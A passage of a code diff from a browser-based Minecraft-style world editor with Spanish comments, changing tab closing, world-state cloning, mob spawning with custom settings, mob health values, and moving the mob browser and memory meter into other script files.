         // Restauramos el historial
         if (world.historyData && typeof historyManager !== 'undefined') {
-            historyManager.undoStack = this.cloneData(world.historyData.undoStack);
-            historyManager.redoStack = this.cloneData(world.historyData.redoStack);
+            historyManager.undoStack = world.historyData.undoStack;
+            historyManager.redoStack = world.historyData.redoStack;
         } else if (typeof historyManager !== 'undefined') {
             historyManager.undoStack = [];
             historyManager.redoStack = [];
@@ -1463,6 +1336,17 @@ saveCurrentWorldStateToMemory: function(id) {
     },
 
 
+    // Copia de un "world" SIN los datos pesados de los mapas (scene1, states2, mobs3...): solo los ajustes pequeños
+    // (logros, inventario, versión, reglas...). Sirve para que una pestaña nueva tenga su propio "world".
+    freshWorldShell: function(oldWorld) {
+        if (!oldWorld || typeof oldWorld !== 'object') return oldWorld;
+        const names = (typeof mbwom !== 'undefined' && mbwom.sceneList ? mbwom.sceneList : []).concat(['sceneBG']);
+        const heavy = new RegExp('^(?:' + names.join('|') + ')\\d+$');
+        const shell = {};
+        Object.keys(oldWorld).forEach(k => { if (!heavy.test(k)) shell[k] = oldWorld[k]; });
+        return this.cloneData(shell);
+    },
+
     // Herramienta maestra para hacer copias profundas sin ataduras de referencias
     cloneData: function(data) {
         if (data === undefined) return undefined;
@@ -1481,10 +1365,8 @@ saveCurrentWorldStateToMemory: function(id) {
         if (index === -1) return;
 
         if (this.openWorlds.length === 1) {
-            // Si es la última pestaña, simplemente la limpiamos
-            this.resetGlobalWorldState();
-            this.openWorlds[0].filename = "nuevo_mundo.mbw";
-            this.switchWorld(id);
+            // Es la última pestaña: se cierra DE VERDAD (antes solo se borraban los mobs y el mapa seguía a la vista)
+            this.closeLastWorld();
             return;
         }
 
@@ -1498,6 +1380,50 @@ saveCurrentWorldStateToMemory: function(id) {
         } else {
             this.renderTabs();
         }
+    },
+
+    // Cierra la última pestaña y deja el editor igual que cuando se abre por primera vez: SIN mundo.
+    // Se borran el mapa, los mobs, el jugador, la "foto" dibujada, el historial y la selección.
+    closeLastWorld: function() {
+        this.openWorlds = [];
+        this.activeWorldId = null;
+
+        // 1. Fuera todos los datos del mundo (se dejan solo las funciones y la lista de nombres, como al arrancar)
+        Object.keys(mbwom).forEach(key => {
+            if (typeof mbwom[key] !== 'function' && key !== 'sceneList') delete mbwom[key];
+        });
+        mbwom.currentScene = 1;
+
+        // 2. Fuera la "foto" del mapa y lo que dependía de él
+        if (typeof initializeWorldCache === 'function') initializeWorldCache();   // sin mapa deja la foto vacía y cancela cualquier armado en curso
+        window.fileInfo = { version: "", seed: "", author: "" };
+        window.cheats = false;
+        window.defeatedEnder = false;
+        if (typeof selectedMob !== 'undefined') { selectedMob = null; selectedMobKey = null; }
+        if (typeof draggedMob !== 'undefined') { draggedMob = null; isDraggingMob = false; }
+        if (typeof toggleMobInfo === 'function') { try { toggleMobInfo(false); } catch (e) { /* el panel no estaba */ } }
+
+        // 3. Cámara e historial desde cero
+        if (typeof camera !== 'undefined') { camera.x = 0; camera.y = 0; camera.accX = 0; camera.accY = 0; camera.velX = 0; camera.velY = 0; camera.lastMoveTime = null; }
+        if (typeof historyManager !== 'undefined') {
+            historyManager.undoStack = [];
+            historyManager.redoStack = [];
+            if (typeof historyManager.updateButtonsUI === 'function') historyManager.updateButtonsUI();
+        }
+
+        // 4. Interfaz: nombre del archivo, pestañas, minihotbar del jugador, ícono de dimensión
+        const display = document.getElementById('filename-display');
+        if (display) display.value = 'world';
+        const sideName = document.getElementById('sidebar-world-name');
+        if (sideName) sideName.value = 'world';
+        this.renderTabs();
+        if (typeof window.syncDimensionIcon === 'function') window.syncDimensionIcon();
+        if (typeof window.playerInvRefresh === 'function') window.playerInvRefresh();
+        if (typeof populateWorldInfo === 'function') { try { populateWorldInfo(); } catch (e) { /* panel cerrado */ } }
+        if (typeof worldDirty !== 'undefined') worldDirty = true;
+
+        // 5. Como al arrancar: se ofrece el menú File para abrir otro mundo
+        if (typeof openFileMenu === 'function') openFileMenu();
     },
 
     renderTabs: function() {
@@ -1586,7 +1512,7 @@ let lastHoveredSlot = null;
 // 3. Lógica para seguir al ratón y actualizar el contenido dinámicamente
 document.addEventListener('mousemove', (e) => {
     // Buscamos si el ratón está sobre un slot encantado
-    let slot = e.target.closest('.enchanted-slot');
+    let slot = e.target.closest('.enchanted-slot, .pinv-tip');   // pinv-tip: tooltips del inventario del jugador (sin brillo morado)
     
     if (slot) {
         // Si cambiamos de slot, actualizamos el contenido
@@ -2499,14 +2425,23 @@ function populateWorldInfo() {
     if (sizeSpan && typeof fileManager !== 'undefined') {
         
         // Si no hay mundo creado, es desconocido
+        const infoPanel = document.getElementById('world-info-sidebar');
+        const panelOpen = !!infoPanel && infoPanel.style.display === 'flex';
         if (!mbwom || !mbwom.world) {
             sizeSpan.innerText = "Unknown";
+        } else if (!panelOpen) {
+            // Con el panel cerrado no se calcula: era lo más pesado de abrir un mundo grande (1.5 s) y nadie lo estaba viendo.
+            // Se calcula en cuanto se abre el panel (toggleWorldInfo vuelve a llamar a esta función).
+            sizeSpan.innerText = "-";
         } else {
             // Ponemos un texto temporal mientras calcula (porque comprimir toma unos ms)
             sizeSpan.innerText = "Calculating...";
             
             // Usamos setTimeout para no congelar la UI si el mundo es muy grande
             setTimeout(() => {
+                // Si mientras tanto se cerró el panel, no hace falta calcularlo
+                const stillOpen = document.getElementById('world-info-sidebar');
+                if (!stillOpen || stillOpen.style.display !== 'flex') { sizeSpan.innerText = "-"; return; }
                 try {
                     // Preparamos los datos tal cual se harían para exportar
                     let currentScene = (typeof mbwom.currentScene !== 'undefined') ? mbwom.currentScene : 1;
@@ -2655,20 +2590,27 @@ function renderRecentMobs() {
 }
 
 // 2. Al seleccionar un mob, lo pasa al frente de la lista y activa la herramienta
-function selectMobToSpawn(type) {
+// 'spec' (opcional) = los datos personalizados del panel del Mob Browser (nombre, vida, armadura...).
+// Con 'spec', cada clic en el mundo crea un mob con esos datos (ver applyMobSpec en mob-editor.js).
+// Sin 'spec' el mob sale tal cual su plantilla. Los mobs personalizados no entran a la lista de
+// "recientes" de arriba (esa lista solo crea mobs normales); para reutilizarlos está la pestaña Custom.
+function selectMobToSpawn(type, spec) {
     currentMobToSpawn = type;
+    window.currentMobSpec = spec || null;
     currentTool = 'spawn_mob'; // Forzamos la herramienta
 
-    // Actualizamos la lista de recientes (Lo movemos al inicio)
-    recentMobsList = recentMobsList.filter(m => m !== type);
-    recentMobsList.unshift(type);
-    
-    // Si la lista supera los 3, borramos el más antiguo
-    if (recentMobsList.length > 3) {
-        recentMobsList.pop();
-    }
+    if (!spec) {
+        // Actualizamos la lista de recientes (Lo movemos al inicio)
+        recentMobsList = recentMobsList.filter(m => m !== type);
+        recentMobsList.unshift(type);
 
-    renderRecentMobs(); // Re-dibujamos el menú superior
+        // Si la lista supera los 3, borramos el más antiguo
+        if (recentMobsList.length > 3) {
+            recentMobsList.pop();
+        }
+
+        renderRecentMobs(); // Re-dibujamos el menú superior
+    }
     
     // Cerramos el modal por si estaba abierto
     try { closeModal('mobs-modal'); } catch(e){}
@@ -2686,8 +2628,8 @@ let activeMobTab = 'Overworld'; // Dimensión por defecto al abrir
 const MOBS_HP_DB = {
     "chicken": 4, "snowgolem": 4, "bat": 6, "rabbit": 3,
     "wolf": 8,
-    "sheep": 8, "pig": 8, "cow": 10, "ghast": 10, "slime": 16, "magmacube": 16,
-    "zombie": 20, "skeleton": 20, "creeper": 20, "spider": 20, "zombiepigman": 20, "blaze": 20, "nethereye": 20,
+    "sheep": 8, "pig": 10, "cow": 10, "ghast": 20, "slime": 4, "magmacube": 4,
+    "zombie": 20, "skeleton": 20, "creeper": 20, "spider": 20, "spawnskin": 20, "zombiepigman": 20, "blaze": 20, "nethereye": 20,
     "dog": 20,
     "enderman": 40, "enderdragon": 333
 };
@@ -2695,100 +2637,16 @@ const MOBS_HP_DB = {
 // Mobs organizados por dimensión
 const MOBS_BY_DIMENSION = {
     "Animals": ["bat", "chicken", "pig", "cow", "cowctus", "mushroom", "rabbit", "sheep", "squid", "wolf", "dog"],
-    "Overworld": ["creeper", "skeleton", "slime", "snowgolem", "spider", "zombie"],
+    "Overworld": ["creeper", "skeleton", "slime", "snowgolem", "spawnskin", "spider", "zombie"],
     "Nether": ["blaze", "ghast", "magmacube", "nethereye", "zombiepigman"],
     "End": ["enderman", "enderdragon"]
 };
 
-// Abre la ventana modal
-function openMobModal() {
-    document.getElementById('mobs-modal').style.display = 'block';
-    filterMobs(activeMobTab); // Forzamos a cargar la pestaña activa
-}
-
-// Función que cambia de pestaña y carga los mobs correspondientes
-function filterMobs(dimension) {
-    activeMobTab = dimension;
-    
-    // 1. Actualizar el CSS de las pestañas
-    document.getElementById('tab-mob-animals').classList.remove('active');
-    document.getElementById('tab-mob-overworld').classList.remove('active');
-    document.getElementById('tab-mob-nether').classList.remove('active');
-    document.getElementById('tab-mob-end').classList.remove('active');
-    
-    document.getElementById('tab-mob-' + dimension.toLowerCase()).classList.add('active');
-
-    // 2. Llenar la cuadrícula
-    const container = document.getElementById('mobs-grid');
-    if (!container) return;
-    
-    container.innerHTML = ''; 
-
-    let mobsToShow = MOBS_BY_DIMENSION[dimension] || [];
-    
-    mobsToShow.forEach(mob => {
-        let niceName = mob.charAt(0).toUpperCase() + mob.slice(1);
-        let imgSrc = (window.images && window.images[mob] && window.images[mob].src) 
-                     ? window.images[mob].src 
-                     : `assets/mobs/${mob}.png`;
-
-        // ✨ AQUÍ USAMOS LAS NUEVAS CLASES EXCLUSIVAS 'mob-item' y 'mob-name' ✨
-        container.innerHTML += `
-        <div class="mob-item" onclick="previewMob('${mob}')" title="${niceName}" style="margin: 0; height: 156px; border-bottom: 2px solid #272727; border-right: 2px solid #272727;">
-            <img src="${imgSrc}" style="width: 90%; height: 90%; object-fit: contain; image-rendering: pixelated;" onerror="this.onerror=null; this.src='assets/mobs/${mob}.png'">
-            <span class="mob-name" style="font-size: 14px; margin-top: 0px;">${niceName}</span>
-        </div>
-        `;
-    });
-
-    // 3. Auto-seleccionar el primer mob de la lista
-    if (mobsToShow.length > 0) {
-        previewMob(mobsToShow[0]);
-    }
-}
-
 // ==========================================
-// 🐷 LÓGICA DEL MOB BROWSER ORIGINAL
+// ✨ MOB BROWSER (ventana, pestañas, panel lateral y Custom)
 // ==========================================
-
-window.previewMob = function(mob) {
-    currentlyPreviewedMob = mob;
-    
-    let niceName = mob.charAt(0).toUpperCase() + mob.slice(1);
-    let imgSrc = (window.images && window.images[mob] && window.images[mob].src) 
-                 ? window.images[mob].src 
-                 : `assets/mobs/${mob}.png`;
-                 
-    // Actualizamos la imagen
-    const imgEl = document.getElementById('mob-preview-image');
-    if (imgEl) {
-        imgEl.src = imgSrc;
-        imgEl.onerror = function() { this.src = `assets/mobs/${mob}.png`; }; 
-    }
-    
-    // Actualizamos los textos
-    const titleEl = document.getElementById('mob-info-title');
-    if (titleEl) titleEl.innerText = niceName;
-    
-    const hpEl = document.getElementById('mob-info-hp');
-    if (hpEl) {
-        let hp = MOBS_HP_DB[mob] || 20; 
-        hpEl.innerText = `Health: ${hp} HP`;
-    }
-
-    // Sonido
-    if (typeof audioManager !== 'undefined') {
-        audioManager.playMobSound(mob);
-    }
-};
-
-window.spawnPreviewedMob = function() {
-    if (currentlyPreviewedMob) {
-        if (typeof selectMobToSpawn === 'function') {
-            selectMobToSpawn(currentlyPreviewedMob);
-        }
-    }
-};
+// Todo el código del Mob Browser (openMobModal, filterMobs, previewMob, spawnPreviewedMob)
+// vive ahora en scripts/mob-editor.js. Aquí solo quedan los datos compartidos de arriba.
 
 // Inicializamos la barra al cargar la página
 window.addEventListener('DOMContentLoaded', () => {
@@ -3196,19 +3054,4 @@ function renderToolbarSettingsList() {
 window.addEventListener('DOMContentLoaded', initToolbarSettings);
 
 
-// ✨ MAGIA DE MEMORIA (RAM) ✨
-const memoryDisplay = document.getElementById('memory-display');
-if (memoryDisplay && window.performance && window.performance.memory) {
-    // Convierte los Bytes a Megabytes de manera redondeada
-    const memoryMB = Math.round(window.performance.memory.usedJSHeapSize / (1024 * 1024));
-    memoryDisplay.innerText = "MEM: " + memoryMB + " MB";
-    
-    // Si gastas más de 800 MB se pone Rojo, si gastas más de 400 MB en Amarillo
-    if (memoryMB > 800) {
-        memoryDisplay.style.color = "#e74c3c"; // Rojo (Peligro de lag/crash)
-    } else if (memoryMB > 400) {
-        memoryDisplay.style.color = "#f1c40f"; // Amarillo (Cuidado)
-    } else {
-        memoryDisplay.style.color = "#bdc3c7"; // Gris (Limpio y fresco)
-    }
-}
+// (El medidor de FPS, la memoria, el zoom y la pantalla completa ahora viven en scripts/status-bar.js)
